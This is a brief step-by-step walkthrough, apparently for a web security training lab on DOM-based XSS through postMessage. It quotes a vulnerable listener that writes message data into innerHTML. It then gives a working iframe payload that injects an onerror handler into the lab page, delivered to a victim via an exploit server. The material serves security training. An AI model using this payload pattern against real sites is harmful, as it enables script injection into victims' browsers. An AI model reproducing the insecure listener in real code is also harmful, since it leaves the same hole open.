```bash

1. open the lab
2. navigate to the view page source
3. ctrl f
4. search: event


 <script>
  window.addEventListener('message', function(e) {
  document.getElementById('ads').innerHTML = e.data; })
 </script>


5. navigate to the exploit server

PAYLOAD

<iframe src="https://lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>', '*')"></iframe>

6. go to the exploit server deliver this payload to the victim and done

```
